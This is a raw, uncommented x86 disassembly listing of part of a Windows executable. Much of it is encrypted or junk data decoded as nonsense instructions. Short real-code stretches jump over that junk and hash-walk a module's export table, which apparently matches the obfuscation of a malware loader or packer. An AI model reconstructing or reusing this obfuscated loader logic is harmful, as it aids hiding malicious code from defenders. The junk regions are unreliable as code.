  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4337ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ah,BYTE PTR [edx-0x68]
  40ebb5:	pop    eax
  40ebb6:	stos   BYTE PTR es:[edi],al
  40ebb7:	call   0x7e7f:0x547e7ea5
  40ebbe:	jle    0x40ebb1
  40ebc0:	jo     0x40ebe9
  40ebc2:	aas    
  40ebc3:	inc    ecx
  40ebc4:	sbb    DWORD PTR [edi-0x77f2686f],ebp
  40ebca:	sbb    DWORD PTR [ebx],ecx
  40ebcc:	aad    0x56
  40ebce:	add    BYTE PTR [ebx+0x5],ch
  40ebd1:	xchg   esp,eax
  40ebd2:	adc    ebp,DWORD PTR [edx-0x15256615]
  40ebd8:	xor    al,0x44
  40ebda:	mov    eax,0x75c43ef7
  40ebdf:	xchg   esp,eax
  40ebe0:	icebp  
  40ebe1:	xchg   esp,eax
  40ebe2:	lea    ebx,[edi+0x13]
  40ebe5:	in     al,dx
  40ebe6:	mov    dh,0xf4
  40ebe8:	retf   
  40ebe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebea:	in     al,dx
  40ebeb:	xlat   BYTE PTR ds:[ebx]
  40ebec:	fsub   st,st(1)
  40ebee:	fld    TBYTE PTR [ecx]
  40ebf0:	aas    
  40ebf1:	pop    ecx
  40ebf2:	and    DWORD PTR [ecx-0x6b08d6cb],ebx
  40ebf8:	mov    ah,0x8
  40ebfa:	data16 mov dh,0xed
  40ebfd:	add    eax,0xdab9a12f
  40ec02:	adc    edx,DWORD PTR [esi-0x4511cf21]
  40ec08:	fwait
  40ec09:	cdq    
  40ec0a:	add    ah,BYTE PTR [ecx+0x233f308b]
  40ec10:	mov    edx,0xd06f97f
  40ec15:	pop    ds
  40ec16:	inc    esi
  40ec17:	xlat   BYTE PTR ds:[ebx]
  40ec18:	in     al,dx
  40ec19:	test   DWORD PTR [esi],0xd0686372
  40ec1f:	(bad)  
  40ec22:	in     al,0x80
  40ec24:	inc    edi
  40ec25:	xchg   ebx,eax
  40ec26:	mov    eax,ds:0xda465c77
  40ec2b:	fcmove st,st(0)
  40ec2d:	cmp    BYTE PTR [ebx],0xe2
  40ec30:	clc    
  40ec31:	pop    ebp
  40ec32:	rcr    eax,cl
  40ec34:	aas    
  40ec35:	jge    0x40ec36
  40ec37:	dec    ecx
  40ec38:	popa   
  40ec39:	jno    0x40ebd0
  40ec3b:	retf   
  40ec3c:	and    DWORD PTR [ebx],eax
  40ec3e:	cmp    WORD PTR [esi],0x1436
  40ec43:	dec    ebp
  40ec44:	and    al,0x51
  40ec46:	jecxz  0x40ecb1
  40ec48:	xchg   ebp,eax
  40ec49:	or     ch,cl
  40ec4b:	call   0xa660:0x8b97f576
  40ec52:	sbb    BYTE PTR [edx+ecx*2],ah
  40ec55:	mov    ch,0xb3
  40ec57:	pop    ds
  40ec58:	shl    DWORD PTR [eax+0x1f836fa8],0x53
  40ec5f:	jecxz  0x40ec13
  40ec61:	test   BYTE PTR [ebp+0x9f6cc7e],bl
  40ec67:	shl    ebx,1
  40ec69:	cmp    BYTE PTR [ebx],dh
  40ec6b:	and    BYTE PTR [ebp+0x1a],dl
  40ec6e:	jge    0x40ec58
  40ec70:	outs   dx,BYTE PTR ds:[esi]
  40ec71:	pop    ebp
  40ec72:	inc    ebp
  40ec73:	and    DWORD PTR [edx+0x5d],esp
  40ec76:	add    al,0x37
  40ec78:	sbb    eax,0x833fe53a
  40ec7d:	and    esi,DWORD PTR [ebx+0x44]
  40ec80:	xor    eax,0x15fd97d0
  40ec85:	inc    ebp
  40ec86:	mov    ds:0xf8da8f07,eax
  40ec8b:	jg     0x40ecc9
  40ec8d:	mov    al,ds:0xeccd07a
  40ec92:	jnp    0x40ecbf
  40ec94:	dec    esi
  40ec95:	or     esi,DWORD PTR [ecx-0x74]
  40ec98:	sub    ebp,edx
  40ec9a:	inc    esp
  40ec9b:	xchg   edx,eax
  40ec9c:	cmp    BYTE PTR [ebx],cl
  40ec9e:	ror    DWORD PTR [ecx+edx*2],cl
  40eca1:	sbb    esp,ebx
  40eca3:	mov    dh,BYTE PTR [esi-0x2f]
  40eca6:	cmp    edi,ebx
  40eca8:	xchg   esp,eax
  40eca9:	sbb    DWORD PTR ds:0x99b8aac7,esi
  40ecaf:	sbb    ah,ah
  40ecb1:	retf   
  40ecb2:	mov    dh,0xb8
  40ecb4:	(bad)  
  40ecb5:	or     al,0x12
  40ecb7:	int    0x6e
  40ecb9:	into   
  40ecba:	xlat   BYTE PTR ds:[ebx]
  40ecbb:	mov    ch,bl
  40ecbd:	ret    0x50ba
  40ecc0:	add    ecx,esi
  40ecc2:	mov    ebx,0xb6b4f976
  40ecc7:	cmc    
  40ecc8:	mov    al,ds:0x4c0ecddc
  40eccd:	push   ds
  40ecce:	sbb    eax,0x83bbd236
  40ecd3:	dec    ebx
  40ecd4:	sbb    cl,cl
  40ecd6:	test   BYTE PTR [edi],ah
  40ecd8:	pop    edx
  40ecd9:	push   ecx
  40ecda:	lds    ebx,FWORD PTR [eax]
  40ecdc:	xchg   esi,eax
  40ecdd:	xchg   esp,eax
  40ecde:	into   
  40ecdf:	outs   dx,DWORD PTR ds:[esi]
  40ece0:	je     0x40ed00
  40ece2:	and    edi,DWORD PTR [eax]
  40ece4:	pop    esp
  40ece5:	sar    BYTE PTR [edx],1
  40ece7:	in     eax,0x56
  40ece9:	dec    ebp
  40ecea:	lds    esi,FWORD PTR [ecx-0x42]
  40eced:	bound  edi,QWORD PTR [ecx]
  40ecef:	mov    cl,0x9f
  40ecf1:	sar    BYTE PTR [eax+0x12],1
  40ecf4:	mov    ds:0x3cece3fd,eax
  40ecf9:	ror    DWORD PTR [edx-0x27],0x61
  40ecfd:	popa   
  40ecfe:	inc    ebx
  40ecff:	mov    DWORD PTR [eax-0x5fec41b0],edx
  40ed05:	push   0x784ac738
  40ed0a:	xchg   BYTE PTR [edx-0x2e],bl
  40ed0d:	popa   
  40ed0e:	cmp    ebx,DWORD PTR [edi+0x103fd8dd]
  40ed14:	xchg   BYTE PTR [edi],bl
  40ed16:	pop    es
  40ed17:	mov    ch,0xb3
  40ed19:	aaa    
  40ed1a:	lea    eax,[esi+0x6bc5f946]
  40ed20:	stc    
  40ed21:	mov    ds:0x592bd1e5,al
  40ed26:	aas    
  40ed27:	adc    al,0x4b
  40ed29:	out    dx,eax
  40ed2a:	push   eax
  40ed2b:	xchg   ebp,eax
  40ed2c:	lock push ss
  40ed2e:	or     ch,BYTE PTR [ecx-0x65e04e53]
  40ed34:	pusha  
  40ed35:	jmp    0x7a7d:0x7340057e
  40ed3c:	or     esp,DWORD PTR [ecx+0x2d]
  40ed3f:	cmp    DWORD PTR ds:0x80b21c7,edi
  40ed45:	inc    esp
  40ed46:	push   0x6f
  40ed48:	shl    DWORD PTR [ecx+0x18582c9f],cl
  40ed4e:	out    dx,al
  40ed4f:	or     al,0x3d
  40ed51:	addr16 dec ebp
  40ed53:	or     BYTE PTR [ebx-0x59],cl
  40ed56:	sub    dh,BYTE PTR [edi+0x3d1269cb]
  40ed5c:	push   0xcb108d1e
  40ed61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed62:	sbb    ecx,edx
  40ed64:	pop    edx
  40ed65:	dec    edx
  40ed66:	pop    ds
  40ed67:	xchg   edx,eax
  40ed68:	mov    WORD PTR [esp+eiz*8-0x79],cs
  40ed6c:	int3   
  40ed6d:	call   0x2de5:0xb5303883
  40ed74:	enter  0x4bc5,0xb1
  40ed78:	loopne 0x40ed0b
  40ed7a:	loopne 0x40ed49
  40ed7c:	(bad)  
  40ed7d:	sub    al,0xef
  40ed7f:	test   al,0xce
  40ed81:	mov    esi,0xd3ce9b9f
  40ed86:	fsub   st(7),st
  40ed88:	nop
  40ed89:	outs   dx,DWORD PTR ds:[esi]
  40ed8a:	pop    ss
  40ed8b:	int3   
  40ed8c:	sub    dl,BYTE PTR [eax+0x6e]
  40ed8f:	std    
  40ed90:	adc    esp,DWORD PTR [ecx+0x59]
  40ed93:	cmp    edx,DWORD PTR [ebx+0x10db5678]
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x4336d3
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x433753,0x18
  40edad:	cmp    DWORD PTR ds:0x433753,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433753,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433753
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433753,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x37d9500b]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	leave  
  40ee77:	or     ecx,DWORD PTR [edi-0x65967f55]
  40ee7d:	(bad)  
  40ee7e:	jge    0x40ee88
  40ee80:	retf   
  40ee81:	imul   edx,DWORD PTR [edx],0xd
  40ee84:	adc    eax,0x8ea0dbc5
  40ee89:	inc    edi
  40ee8a:	adc    al,bh
  40ee8c:	cmp    eax,0x340a96e6
  40ee91:	es scas eax,DWORD PTR es:[edi]
  40ee93:	rsm    
  40ee95:	mov    BYTE PTR [esi+0x77],cl
  40ee98:	sub    eax,0x54d1758d
  40ee9d:	and    eax,0x54fa8240
  40eea2:	push   cs
  40eea3:	(bad)  
  40eea5:	push   esi
  40eea6:	pop    edi
  40eea7:	sub    cl,BYTE PTR [esi-0x25]
  40eeaa:	adc    BYTE PTR [edi-0x389f8dd4],dl
  40eeb0:	xchg   ecx,eax
  40eeb1:	enter  0x8414,0x19
  40eeb5:	out    0x36,al
  40eeb7:	jae    0x40eeb1
  40eeb9:	sub    edi,0x5c
  40eebc:	sbb    edi,edi
  40eebe:	loope  0x40eeaa
  40eec0:	cs xchg al,dh
  40eec3:	imul   edi,DWORD PTR [ecx+0x5cd9930f],0xa0d804e8
  40eecd:	call   0xb92f:0x91ad5eef
  40eed4:	es fmul st,st(3)
  40eed7:	mov    ch,0x80
  40eed9:	xchg   edx,eax
  40eeda:	fs jbe 0x40eebb
  40eedd:	adc    dh,BYTE PTR [ebp-0x6e]
  40eee0:	pop    esi
  40eee1:	mov    edi,0x426fa228
  40eee6:	mov    edx,0x26f1aeb2
  40eeeb:	xor    al,0x5b
  40eeed:	(bad)  
  40eeee:	mov    edx,0xc06d50e
  40eef3:	mov    ds:0x6f3211f,eax
  40eef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eefa:	mov    eax,eax
  40eefc:	cmp    BYTE PTR [edi+ebp*2+0x52adbeed],0x99
  40ef04:	fs jo  0x40ef06
  40ef07:	inc    eax
  40ef08:	setp   BYTE PTR [edi+0x220f3dd6]
  40ef0f:	and    esp,DWORD PTR [esi+ecx*8-0x52]
  40ef13:	int    0x90
  40ef15:	xchg   ax,ax
  40ef17:	adc    DWORD PTR [ecx+0x67812add],ebx
  40ef1d:	ss nop
  40ef1f:	in     al,dx
  40ef20:	stos   BYTE PTR es:[edi],al
  40ef21:	imul   esi,edx,0x26
  40ef24:	test   DWORD PTR [ebx],edi
  40ef26:	jo     0x40ef3e
  40ef28:	pop    edi
  40ef29:	hlt    
  40ef2a:	xchg   edi,eax
  40ef2b:	mov    edx,0x52f9f823
  40ef30:	sub    BYTE PTR [ecx+0x58],dh
  40ef33:	mov    dl,0x11
  40ef35:	enter  0x5ab2,0xe0
  40ef39:	imul   edi,DWORD PTR [edi],0xffffffcf
  40ef3c:	or     eax,0xc97997fc
  40ef41:	es adc esp,ebp
  40ef44:	xor    dl,ch
  40ef46:	or     bl,0x53
  40ef49:	cmp    al,BYTE PTR [esi-0x4b]
  40ef4c:	or     DWORD PTR [eax+0x2caaec00],eax
  40ef52:	dec    ebp
  40ef53:	pop    ebp
  40ef54:	sub    BYTE PTR [ecx+0x2b409419],ah
  40ef5a:	stos   BYTE PTR es:[edi],al
  40ef5b:	pusha  
  40ef5c:	cmp    eax,DWORD PTR [ebp+0x20]
  40ef5f:	call   0xeb2d6a67
  40ef64:	dec    esi
  40ef65:	inc    esi
  40ef66:	(bad)  
  40ef68:	add    ebx,DWORD PTR ds:0xa7e7431c
  40ef6e:	push   0x1b
  40ef70:	mov    eax,0xea36c6f8
  40ef75:	or     BYTE PTR [ecx+0x52],cl
  40ef78:	or     ch,dh
  40ef7a:	xchg   ebp,eax
  40ef7b:	sti    
  40ef7c:	cmp    ch,al
  40ef7e:	mov    dl,0x14
  40ef80:	fadd   st,st(4)
  40ef82:	pop    esi
  40ef83:	adc    BYTE PTR [edx+eax*1],cl
  40ef86:	push   0x2e
  40ef88:	push   ecx
  40ef89:	repnz leave 
  40ef8b:	add    BYTE PTR [edx],0x77
  40ef8e:	test   BYTE PTR [ecx],dh
  40ef90:	arpl   WORD PTR [ecx-0x636b511b],bx
  40ef96:	jne    0x40ef68
  40ef98:	xchg   edi,eax
  40ef99:	sti    
  40ef9a:	mov    dh,0x36
  40ef9c:	lock mov ebx,0xe2c9ea06
  40efa2:	clc    
  40efa3:	cdq    
  40efa4:	mov    ds:0x401554d6,al
  40efa9:	push   ds
  40efaa:	push   ss
  40efab:	aaa    
  40efac:	adc    edi,DWORD PTR [ebp+0x21]
  40efaf:	enter  0xf216,0x18
  40efb3:	stc    
  40efb4:	(bad)  [eax-0x63]
  40efb7:	pop    esi
  40efb8:	pop    edx
  40efb9:	mov    ah,0x7f
  40efbc:	fs inc edi
  40efbe:	cmp    al,0x3d
  40efc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc1:	inc    ebp
  40efc2:	(bad)  
  40efc3:	mov    cl,0x5d
  40efc5:	mov    bh,BYTE PTR [edi+0x22]
  40efc8:	sbb    bl,cl
  40efca:	inc    eax
  40efcb:	adc    DWORD PTR [edx-0x7b],0x6bd51190
  40efd2:	sbb    eax,0x36555ce6
  40efd7:	int3   
  40efd8:	sub    eax,0xdd575379
  40efdd:	inc    ebp
  40efde:	(bad)  
  40efdf:	mul    BYTE PTR [eax+eax*2]
  40efe2:	mov    esi,0xc6ebe361
  40efe7:	sub    al,0x20
  40efe9:	out    dx,eax
  40efea:	mov    ds:0x8a80157c,eax
  40efef:	inc    esi
  40eff0:	dec    ebp
  40eff1:	je     0x40efb3
  40eff3:	enter  0x7d2f,0x19
  40eff7:	fcomp  DWORD PTR [ebx-0x5ee164ef]
  40effd:	addr16 aad 0xf7
  40f000:	inc    esi
  40f001:	sub    ebx,eax
  40f003:	mov    al,ds:0x8fc8700f
  40f008:	sub    ch,BYTE PTR [ebx-0x1dc61ffe]
  40f00e:	adc    BYTE PTR [edi+0x55],bl
  40f011:	nop
  40f012:	jl     0x40ef9c
  40f014:	inc    ebp
  40f015:	jb     0x40f02e
  40f017:	aas    
  40f018:	or     al,0x67
  40f01a:	fisubr WORD PTR [edx-0xea2ab73]
  40f020:	mov    edi,0xebfea6b7
  40f025:	inc    esi
  40f026:	mov    ecx,0x3acc49c
  40f02b:	dec    esi
  40f02c:	cld    
  40f02d:	cmc    
  40f02e:	leave  
  40f02f:	add    al,0x45
  40f031:	xor    eax,DWORD PTR [edx-0x17570216]
  40f037:	cli    
  40f038:	add    edx,DWORD PTR [eax]
  40f03a:	aam    0xb6
  40f03c:	pop    es
  40f03d:	addr16 mov edx,0xad80bc51
  40f043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f044:	sub    edi,DWORD PTR [ebx-0xa]
  40f047:	daa    
  40f048:	daa    
  40f049:	jne    0x40f054
  40f04b:	push   esi
  40f04c:	jne    0x40f074
  40f04e:	adc    BYTE PTR [ecx-0x75],cl
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43371b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xc4801594,ebx
  40f076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f077:	(bad)  
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	test   eax,0x9d7bfbef
  40f085:	cmp    al,0xfe
  40f087:	and    eax,0xda1b1a53
  40f08c:	xor    al,0xa0
  40f08e:	ret    0x961e
  40f091:	(bad)  
  40f092:	int3   
  40f093:	adc    bh,BYTE PTR [bx+si+0x2c0f]
  40f098:	dec    esp
  40f099:	cmp    al,0x46
  40f09b:	adc    eax,0x8f1295a
  40f0a0:	inc    edx
  40f0a1:	lock pushw es
  40f0a4:	sub    esi,DWORD PTR [ecx-0x571443df]
  40f0aa:	jb     0x40f0f9
  40f0ac:	mov    ds:0x4efbd919,eax
  40f0b1:	mov    al,0x62
  40f0b3:	mov    ebp,0xa6d9b0ed
  40f0b8:	mul    DWORD PTR [eax-0x7843adc4]
  40f0be:	and    BYTE PTR [ebp-0x5ab51a95],0x54
  40f0c5:	inc    esp
  40f0c6:	imul   esp,DWORD PTR [edx+ebx*2],0xd85a33a4
  40f0cd:	sbb    ch,BYTE PTR [esi-0x6b5af55a]
  40f0d3:	add    al,0xf8
  40f0d5:	xchg   ebp,eax
  40f0d6:	scas   eax,DWORD PTR es:[edi]
  40f0d7:	aad    0x80
  40f0d9:	mov    edx,0xec660ed0
  40f0de:	lock dec edx
  40f0e0:	ficomp DWORD PTR [esi-0x14]
  40f0e3:	mov    ds:0x2004a18b,al
  40f0e8:	xchg   edi,eax
  40f0e9:	xchg   edx,eax
  40f0ea:	sbb    eax,0x2e5043fc
  40f0ef:	shr    DWORD PTR [eax+0x19],0xab
  40f0f3:	leave  
  40f0f4:	pop    ss
  40f0f5:	fcomp  DWORD PTR [edx]
  40f0f7:	packssdw mm4,QWORD PTR [edi-0x3f]
  40f0fb:	mov    dh,0x7c
  40f0fd:	cmp    cl,ah
  40f0ff:	cs pop ecx
  40f101:	sub    esi,DWORD PTR [edi]
  40f103:	jmp    DWORD PTR [esi]
  40f105:	pushf  
  40f106:	mov    dh,0x19
  40f108:	repz retf 
  40f10a:	jnp    0x40f099
  40f10c:	stos   BYTE PTR es:[edi],al
  40f10d:	test   eax,0x7d69cd02
  40f112:	sub    eax,0xedff308d
  40f117:	into   
  40f118:	dec    ebp
  40f119:	mov    WORD PTR ds:0x11ee109b,cs
  40f11f:	retf   
  40f120:	ins    DWORD PTR es:[edi],dx
  40f121:	ret    
  40f122:	xchg   ebp,eax
  40f123:	clc    
  40f124:	push   0x23
  40f126:	(bad)  
  40f127:	mov    dh,0x8
  40f129:	pop    edx
  40f12a:	not    DWORD PTR [eax-0x59308e2c]
  40f130:	retf   0x49b3
  40f133:	push   ebp
  40f134:	or     dh,ch
  40f136:	cdq    
  40f137:	xor    al,0x26
  40f139:	stos   DWORD PTR es:[edi],eax
  40f13a:	mov    cl,0x86
  40f13c:	in     eax,0x6e
  40f13e:	cli    
  40f13f:	pop    ebx
  40f140:	mov    cl,0xce
  40f142:	dec    edi
  40f143:	inc    edi
  40f144:	pushf  
  40f145:	sub    BYTE PTR [ecx+0x7e],ch
  40f148:	mov    esi,0xd92cbfec
  40f14d:	pop    ds
  40f14e:	push   ebx
  40f14f:	jg     0x40f174
  40f151:	enter  0xe831,0xed
  40f155:	xchg   edi,eax
  40f156:	pop    edx
  40f157:	xchg   edx,eax
  40f158:	dec    ecx
  40f159:	jb     0x40f173
  40f15b:	cmp    al,BYTE PTR [ebx+0xe]
  40f15e:	mov    esi,0xfcf0b2cb
  40f163:	outs   dx,DWORD PTR ds:[esi]
  40f164:	repz test BYTE PTR [ecx],bh
  40f167:	je     0x40f1d0
  40f169:	mov    bh,0x76
  40f16b:	adc    eax,0x7aee8bcb
  40f170:	xchg   cl,bh
  40f172:	test   eax,0x69db9f04
  40f177:	icebp  
  40f178:	pop    ecx
  40f179:	push   esp
  40f17a:	fwait
  40f17b:	add    DWORD PTR [ebx+0xe3f615c],ecx
  40f181:	dec    eax
  40f182:	pop    ss
  40f183:	outs   dx,BYTE PTR ds:[esi]
  40f184:	ror    DWORD PTR [edx-0x5a34d9d5],1
  40f18a:	or     DWORD PTR [edi+0x64],esi
  40f18d:	mov    DWORD PTR [ebx],esi
  40f18f:	adc    eax,DWORD PTR [edi]
  40f191:	push   ecx
  40f192:	mov    dh,0x51
  40f194:	dec    edi
  40f195:	(bad)  
  40f196:	test   BYTE PTR [edi],0x72
  40f199:	lahf   
  40f19a:	les    ebx,FWORD PTR [edx-0x41]
  40f19d:	sbb    BYTE PTR [ebx],bh
  40f19f:	cmp    DWORD PTR [esp+edx*8+0x7b],esp
  40f1a3:	out    dx,al
  40f1a4:	push   esp
  40f1a5:	jns    0x40f20a
  40f1a7:	mov    al,0xca
  40f1a9:	outs   dx,DWORD PTR ds:[esi]
  40f1aa:	adc    ch,BYTE PTR ds:0xe7d631bd
  40f1b0:	and    DWORD PTR [esi+0x50],0xb67bc4ce
  40f1b7:	dec    eax
  40f1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b9:	push   edi
  40f1ba:	sub    ebp,DWORD PTR [ecx-0x71e2bbd]
  40f1c0:	push   cs
  40f1c1:	into   
  40f1c2:	retf   0x6c24
  40f1c5:	lods   eax,DWORD PTR ds:[esi]
  40f1c6:	fwait
  40f1c7:	test   BYTE PTR [eax-0x471cb19],ah
  40f1cd:	mov    al,ds:0x15156892
  40f1d2:	iret   
  40f1d3:	jp     0x40f243
  40f1d5:	mov    ds:0xeedbdf6b,eax
  40f1da:	int3   
  40f1db:	icebp  
  40f1dc:	jecxz  0x40f223
  40f1de:	(bad)  
  40f1df:	enter  0x5b15,0x1d
  40f1e3:	xor    esi,esp
  40f1e5:	not    esp
  40f1e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1e8:	mov    DWORD PTR es:[ebx+0x65a62d57],eax
  40f1ef:	add    DWORD PTR [eax],eax
  40f1f1:	fdivr  st,st(2)
  40f1f3:	pop    esp
  40f1f4:	daa    
  40f1f5:	cdq    
  40f1f6:	inc    eax
  40f1f7:	sbb    cl,BYTE PTR [edx+0x8709354]
  40f1fd:	in     al,0xfe
  40f1ff:	cdq    
  40f200:	jbe    0x40f1c4
  40f202:	dec    edi
  40f203:	scas   al,BYTE PTR es:[edi]
  40f204:	call   0xa3c4:0xcd3d580d
  40f20b:	add    DWORD PTR [edi-0x3a],esp
  40f20e:	loopne 0x40f1eb
  40f210:	(bad)  
  40f211:	leave  
  40f212:	fidivr WORD PTR [edx-0x37]
  40f215:	clc    
  40f216:	xchg   ecx,eax
  40f217:	pop    ecx
  40f218:	out    0x82,eax
  40f21a:	inc    ebp
  40f21b:	mov    cl,0x55
  40f21d:	or     al,0x35
  40f21f:	nop
  40f220:	xlat   BYTE PTR ds:[ebx]
  40f221:	mov    bl,0x74
  40f223:	test   BYTE PTR [esi+0x5d],0xc0
  40f227:	nop
  40f228:	inc    edx
  40f229:	sub    al,0x71
  40f22b:	jb     0x40f228
  40f22d:	sub    DWORD PTR [ecx+0x24080f83],eax
  40f233:	js     0x40f23e
  40f235:	aaa    
  40f236:	les    ebx,FWORD PTR [ecx]
  40f238:	pop    DWORD PTR [ecx+0x2e]
  40f23b:	aam    0x96
  40f23d:	pushf  
  40f23e:	aad    0x56
  40f240:	adc    al,0x41
  40f242:	pop    ecx
  40f243:	inc    esp
  40f244:	test   BYTE PTR [ecx-0x13930ec1],cl
  40f24a:	xchg   ecx,eax
  40f24b:	add    DWORD PTR [ebp+0x2e],eax
  40f24e:	xchg   BYTE PTR [edi],bh
  40f250:	push   0xe358552
  40f255:	scas   eax,DWORD PTR es:[edi]
  40f256:	sbb    DWORD PTR [esi+ecx*4],0x7c04a7c3
  40f25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f25e:	add    DWORD PTR [ebx+0x42],ecx
  40f261:	push   0x2e
  40f263:	cmp    edi,DWORD PTR [esi]
  40f265:	shl    BYTE PTR [esi+0x5f5a09e],1
  40f26b:	pop    edx
  40f26c:	dec    edi
  40f26d:	jl     0x40f2aa
  40f26f:	mov    edx,0xb4fb6624
  40f274:	scas   eax,DWORD PTR es:[edi]
  40f275:	mov    cl,0x58
  40f277:	ja     0x40f268
  40f279:	push   esi
  40f27a:	sub    al,0xdb
  40f27c:	test   DWORD PTR [edx+0x72],edx
  40f27f:	fld    DWORD PTR [esi]
  40f281:	clc    
  40f282:	cmp    eax,0xda0abcaa
  40f287:	xchg   ebp,eax
  40f288:	test   al,0xe0
  40f28a:	ret    0x3265
  40f28d:	inc    esi
  40f28e:	popa   
  40f28f:	sbb    eax,0x26533ff3
  40f294:	jmp    0x3761:0xa8c5e6b8
  40f29b:	push   esp
  40f29c:	popf   
  40f29d:	aam    0x3b
  40f29f:	out    0xd4,eax
  40f2a1:	fisttp DWORD PTR [ecx+0x3e]
  40f2a4:	lahf   
  40f2a5:	stos   DWORD PTR es:[edi],eax
  40f2a6:	sbb    ah,BYTE PTR [ebx+eiz*8]
  40f2a9:	call   0x3e6d:0x89706fb3
  40f2b0:	sbb    BYTE PTR [ecx],bh
  40f2b2:	icebp  
  40f2b3:	lods   eax,DWORD PTR ds:[esi]
  40f2b4:	xchg   DWORD PTR [ebp+0x1d00cf1d],ebx
  40f2ba:	add    bh,cl
  40f2bc:	sub    DWORD PTR [edi-0x41],0x1e94ae6b
  40f2c3:	pusha  
  40f2c4:	or     DWORD PTR [edi],ebp
  40f2c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2c7:	clc    
  40f2c8:	(bad)  
  40f2c9:	sub    dl,cl
  40f2cb:	cmp    cl,BYTE PTR [esi-0x196c0bea]
  40f2d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d2:	nop
  40f2d3:	pop    ecx
  40f2d4:	pop    edx
  40f2d5:	dec    edi
  40f2d6:	mov    dh,BYTE PTR [ebx+0x7a]
  40f2d9:	mov    ds:0x786f45fb,eax
  40f2de:	push   ebp
  40f2df:	jae    0x40f312
  40f2e1:	ds rcl ebp,cl
  40f2e4:	xor    ecx,esi
  40f2e6:	fucomip st,st(7)
  40f2e8:	(bad)  
  40f2e9:	dec    esi
  40f2ea:	jge    0x40f308
  40f2ec:	mov    ds:0x7d9dc3a,eax
  40f2f1:	test   eax,0xdbc09fdc
  40f2f6:	jo     0x40f352
  40f2f8:	pop    ebp
  40f2f9:	inc    ecx
  40f2fa:	jmp    0xa808:0x641ab03a
  40f301:	mov    bh,0x49
  40f303:	jmp    0x801c:0xfe72b9da
  40f30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f30b:	stos   BYTE PTR es:[edi],al
  40f30c:	add    BYTE PTR [eax],cl
  40f30e:	(bad)  
  40f30f:	sti    
  40f310:	add    BYTE PTR [esi+0x58],bh
  40f313:	and    ebp,DWORD PTR [eax-0x320cb2f2]
  40f319:	cmp    ecx,ebx
  40f31b:	jl     0x40f2ad
